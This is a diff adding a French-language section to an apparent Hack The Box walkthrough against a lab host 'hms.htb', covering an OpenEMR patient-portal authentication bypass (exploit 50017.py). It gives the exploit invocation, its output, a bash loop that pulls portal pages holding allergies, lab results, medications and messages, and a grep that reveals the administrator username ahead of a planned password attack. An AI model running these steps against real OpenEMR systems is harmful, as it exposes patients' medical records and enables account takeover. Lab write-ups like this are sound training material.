@@ -831,8 +831,8 @@ php/webapps/45161.py — OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)
 Il est préférable de créer un sous-répertoire dédié afin de regrouper les exploits OpenEMR, puis d’y copier les trois scripts retenus :
 
 ```bash
-mkdir exploits
-cd exploits
+mkdir hms
+cd hms
 
 searchsploit -m php/webapps/49998.py
 searchsploit -m php/webapps/50017.py
@@ -846,6 +846,192 @@ Les exploits `49998.py` et `45161.py` nécessitent des identifiants OpenEMR vali
 L’exploit `50017.py` est donc la piste la plus logique à examiner en premier, puisqu’il te permet de contourner l’authentification du portail patient et pourrait te révéler des informations utiles sur les comptes présents dans l’application.
 
 
+
+### Contournement de l’authentification du portail patient
+
+Tu commences par examiner le code source de l’exploit `50017.py`. 
+
+Son en-tête décrit une vulnérabilité permettant à un utilisateur non authentifié de contourner la connexion du portail patient. 
+
+Le script précise qu’en accédant d’abord à la page d’inscription du portail, il devient possible de demander plusieurs pages normalement réservées à un patient authentifié.
+
+Le commentaire présent dans le code source cite notamment les pages suivantes :
+
+```
+add_edit_event_user.php
+find_appt_popup_user.php
+get_allergies.php
+get_amendments.php
+get_lab_results.php
+get_medications.php
+get_patient_documents.php
+get_problems.php
+get_profile.php
+portal_payment.php
+messaging/messages.php
+messaging/secure_chat.php
+report/pat_ledger.php
+report/portal_custom_report.php
+report/portal_patient_report.php
+```
+
+L’objectif est donc de récupérer ces différentes pages, puis de les examiner à la recherche d’informations utiles, comme des comptes utilisateurs et, éventuellement, leurs identifiants.
+
+Pour regrouper proprement les fichiers récupérés, tu crées un sous-répertoire dédié à cet exploit :
+
+```
+mkdir -p 50017
+```
+
+Avant de lancer l’exploitation, tu affiches l’aide du script afin d’identifier les paramètres attendus :
+
+```bash
+python3 50017.py -h
+usage: 50017.py [-h] [-T IP] [-P PORT] [-U OPENEMRPATH] [-R PATHTOGET]
+
+OpenEMR Authentication bypass
+
+options:
+  -h, --help            show this help message and exit
+  -T, --IP IP
+  -P, --PORT PORT
+  -U, --Openemrpath OPENEMRPATH
+  -R, --PathToGet PATHTOGET
+```
+
+Le script attend donc :
+
+- l’adresse de la cible avec `-T` ;
+- le port utilisé avec `-P` ;
+- le chemin de base de l’installation OpenEMR avec `-U` ;
+- la ressource à récupérer avec `-R`.
+
+Le commentaire du script précise que les fichiers cités sont des *pages in the portal directory*. Comme le portail patient est accessible sous `/portal/`, tu construis leur chemin complet en les préfixant par ce répertoire.
+
+Pour vérifier le fonctionnement du contournement, tu commences par la première page de la liste :
+
+```txt
+/portal/add_edit_event_user.php
+```
+
+Tu lances l’exploit avec :
+
+```bash
+python3 50017.py \
+  -T hms.htb \
+  -P 80 \
+  -U '' \
+  -R '/portal/add_edit_event_user.php' \
+  | tee 50017/add_edit_event_user.txt
+```
+
+L’option `-U ''` indique que l’installation OpenEMR est directement accessible à la racine de `hms.htb`.
+
+La réponse est affichée dans le terminal et enregistrée simultanément dans :
+
+```
+50017/add_edit_event_user.txt
+```
+
+Le script confirme tout d’abord que la cible est vulnérable :
+
+```
+[*] Checking vulnerability:
+
+[+] Host Vulnerable. Proceeding exploit
+
+[+] Results:
+```
+
+Il récupère ensuite le code HTML complet de la page demandée. La présence du formulaire intitulé `Add New Event` confirme que le contournement permet bien d’accéder à cette ressource du portail patient. 
+
+Dans la réponse, une information mérite déjà d’être relevée :
+
+```html
+<td nowrap>
+   <b>Provider:</b>
+</td>
+<td style='padding:0px 5px 5px 0' nowrap>
+  <select class="form-control" name='form_provider_ae' id='form_provider_ae' onchange='change_provider();'>
+    <option value='1'>Administrator, Administrator</option>
+  </select>
+</td>
+```
+
+Cette valeur apparaît dans le champ **Provider** du formulaire de rendez-vous. Elle indique la présence d’un compte administrateur dans OpenEMR, sans encore révéler son nom d’utilisateur ni ses identifiants.
+
+Le premier test ayant confirmé le fonctionnement du contournement, tu peux maintenant automatiser la récupération des autres pages mentionnées dans le code source de l’exploit.
+
+Comme `add_edit_event_user.php` a déjà été téléchargée, tu l’exclus de la liste et utilises une boucle pour récupérer toutes les ressources restantes. Chaque réponse est enregistrée dans le sous-répertoire `50017` :
+
+```bash
+pages=(
+  find_appt_popup_user.php
+  get_allergies.php
+  get_amendments.php
+  get_lab_results.php
+  get_medications.php
+  get_patient_documents.php
+  get_problems.php
+  get_profile.php
+  portal_payment.php
+  messaging/messages.php
+  messaging/secure_chat.php
+  report/pat_ledger.php
+  report/portal_custom_report.php
+  report/portal_patient_report.php
+)
+
+for page in "${pages[@]}"; do
+  output="50017/${page//\//_}"
+  output="${output%.php}.txt"
+
+  python3 50017.py \
+    -T hms.htb \
+    -P 80 \
+    -U '' \
+    -R "/portal/$page" \
+    | tee "$output"
+done.
+```
+
+La substitution suivante remplace les `/` présents dans certains chemins par des `_` :
+
+```bash
+${page//\//_}
+```
+
+Par exemple, la page :
+
+```
+messaging/messages.php
+```
+
+est enregistrée sous le nom :
+
+```
+50017/messaging_messages.txt
+```
+
+Une fois toutes les pages récupérées, tu recherches les occurrences du terme `administrator` dans l’ensemble des fichiers :
+
+```bash
+grep -Rni 'administrator' 50017/
+50017/messaging_messages.txt:67:    $scope.authrecips = [{"userid":"openemr_admin","username":"Administrator Administrator"}];
+50017/add_edit_event_user.txt:86:    <option value='1'>Administrator, Administrator</option>
+```
+
+La seconde ligne correspond à l’information déjà observée dans le formulaire de rendez-vous.
+
+La première est plus intéressante, car elle révèle directement le nom d’utilisateur associé au compte administrateur :
+
+```
+openemr_admin
+```
+
+Tu disposes désormais d’un nom d’utilisateur OpenEMR valide. En revanche, les exploits authentifiés `49998.py` et `45161.py` nécessitent également le mot de passe de ce compte.
+
+La prochaine étape consiste donc à analyser précisément le formulaire de connexion d’OpenEMR afin de préparer une recherche du mot de passe de `openemr_admin`.
 
 
 
